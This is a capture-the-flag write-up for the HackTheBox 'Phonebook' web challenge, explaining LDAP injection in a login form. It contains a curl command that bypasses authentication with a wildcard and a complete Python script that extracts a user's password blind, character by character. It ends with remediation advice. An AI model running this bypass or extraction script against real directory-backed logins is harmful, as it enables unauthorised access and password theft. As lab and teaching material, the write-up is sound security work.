---
title: "Phonebook"
date: 2027-02-12 09:00:00 -0500
categories: [HackTheBox, Challenges, Web]
tags: [hackthebox, challenge, web, ldap-injection, authentication-bypass, blind-injection]
description: "An Easy Web challenge whose login form authenticates against LDAP with an unescaped filter — the same wildcard that bypasses the login also turns it into a per-character oracle that leaks a user's password, which is the flag."
---

## Overview

**Phonebook** is an Easy Web challenge: a login page backed by a directory service (LDAP) plus an authenticated contact search. The login filter is built by unescaped string concatenation, so it is vulnerable to [LDAP injection](https://cwe.mitre.org/data/definitions/90.html) ([CWE-90](https://cwe.mitre.org/data/definitions/90.html)). A single `*` bypasses authentication, and the same wildcard becomes a blind oracle that leaks a user's `userPassword` one character at a time — and that password is the flag.

## The technique

The application authenticates by dropping the submitted username and password straight into an LDAP search filter, roughly:

```python
filter = f"(&(uid={username})(userPassword={password}))"
conn.search(base_dn, filter)
```

Nothing escapes the LDAP metacharacters `* ( ) & |`, so the attacker controls the structure of the filter — the directory-query equivalent of SQL injection. The hint on the login page (*"login using the workstation username and password"*) and the authenticated search returning `cn`/`sn`/`mail`/`homePhone` attributes both confirm an LDAP backend.

## Solution

**Step 1 — Authentication bypass.** Submitting `*` for both fields makes the filter `(&(uid=*)(userPassword=*))`, which matches the first directory entry and logs you in. A redirect to `/` (instead of `/login?message=Authentication failed`) is the success oracle:

```bash
curl -s -o /dev/null -w '%{redirect_url}\n' \
  --data-urlencode 'username=*' --data-urlencode 'password=*' \
  http://TARGET:PORT/login
# -> http://TARGET:PORT/
```

**Step 2 — Blind password extraction.** With a real username, `password=<prefix>*` is a wildcard substring match: it only authenticates when `<prefix>` is a true prefix of that user's `userPassword`. Extend the prefix one character at a time and you reconstruct the whole attribute — which is the flag.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys, requests
T = sys.argv[1]
USER = "reese"
CHARSET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!?-.@#$%^&+=:"

def good(prefix):
    r = requests.post(T + "/login",
                      data={"username": USER, "password": prefix + "*"},
                      allow_redirects=False)
    return "message=Authentication" not in r.headers.get("Location", "")

flag = "HTB{"
while not flag.endswith("}"):
    flag += next(c for c in CHARSET if good(flag + c))
    print("\r" + flag, end="", flush=True)
print("\nFLAG:", flag)
```

Run it against the instance:

```bash
python3 solve.py http://TARGET:PORT
# ...
# FLAG: HTB{...}
```

## Why it worked

LDAP filters have their own metacharacters, and the application spliced user input into the filter string without neutralizing them. The `*` becomes an attacker-controlled wildcard: it first short-circuits the boolean authentication check, then — driven against a known username — converts that single yes/no login response into a per-character extraction oracle. The same class of flaw as SQL injection, just expressed in the directory query language.

## Fix / defense

- **Escape every value** before building the filter: `ldap3.utils.conv.escape_filter_chars(value)` neutralizes `* ( ) \` and NUL.
- Prefer APIs that **parameterize** filters rather than f-string concatenation.
- Bind with a **least-privilege service account** so a successful injection cannot read sensitive attributes.
- Never store a secret (or anything flag-like) in a readable attribute such as `userPassword` or `description`.
